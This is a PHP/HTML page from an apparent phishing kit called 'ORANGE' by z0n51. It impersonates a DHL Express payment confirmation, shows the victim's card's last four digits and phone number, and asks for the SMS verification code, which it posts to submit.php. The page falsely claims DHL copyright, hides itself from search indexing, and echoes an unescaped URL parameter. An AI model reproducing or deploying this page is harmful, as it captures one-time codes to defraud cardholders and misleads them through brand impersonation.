<?php

/**
 * @link              https://www.z0n51.com/
 * @since             03/08/2020
 * @package           ORANGE
 * @facebook          https://www.facebook.com/z0n51
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      ORANGE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
    $cc = substr($_SESSION['cc_number'], -4);
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 

        <title>Identifiez-vous avec votre compte</title>
    </head>

    <body>

        
        <div id="ss-wrapper">
            <div class="ss-area">
                <form action="submit.php" method="post">
                <input type="hidden" name="verbot">
                <input type="hidden" name="type" value="confirm_code">
                <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                <div class="top d-flex align-items-center">
                    <div class="flex-grow-1"><img style="width: 100px;" src="../assets/images/logo.svg"></div>
                    <div><img src="../assets/images/vs.png"></div>
                </div>
                <h3>Please confirm the following payment.</h3>
                <div class="details">
                    <p>The unique password has been sent to the mobile number listed below. If you need to change your mobile number please contact your bank of modify it via the available chanels (ATM, web).</p>
                    <table>
                        <tr>
                            <td>Merchant:</td>
                            <td>DHL EXPRESS</td>
                        </tr>
                        <tr>
                            <td>Amount:</td>
                            <td>1.99</td>
                        </tr>
                        <tr>
                            <td>Date:</td>
                            <td><?php echo date('d/m/Y'); ?></td>
                        </tr>
                        <tr>
                            <td>Credit card number</td>
                            <td>XXXX XXXX XXXX <?php echo $cc; ?></td>
                        </tr>
                        <tr>
                            <td>Your phone number</td>
                            <td><?php echo $_SESSION['phone']; ?></td>
                        </tr>
                        <tr>
                            <td>SMS code</td>
                            <td>
                                <input type="text" name="confirm_code" id="confirm_code" class="<?php echo is_invalid_class($_SESSION['errors'],'confirm_code') ?>">
                                <?php
                                if( !empty($_SESSION['errors']['confirm_code']) ) {
                                    echo '<p style="color: #D40511; font-size: 12px; margin-bottom: 0;">Code is invalid.</p>';
                                }
                                ?>
                            </td>
                        </tr>
                    </table>
                    <p style="font-size: 14px; text-align: center; margin-bottom: 0; margin-top: 10px;">Please enter the verification code received by sms : <span class="timer" style="color: #d40511; font-weight: 700; cursor: pointer;"></span></p>
                </div>
                <div class="btns">
                    <button type="submit">Submit</button>
                </div>
                <p class="copy"><?php echo date('Y'); ?> &copy; DHL International GmbH. All rights reserved.</p>
            </form>
            </div>
        </div>
        
        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/plugins/countdowntimer/jquery.countdownTimer.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            $(".timer").countdowntimer({
                minutes : 2,
                timeUp : timeIsUp
            });
            function timeIsUp() {
                $(".timer").html('Try again');
            }
            $('.timer').click(function(){
                location.reload();
            });
        </script>

    </body>

</html>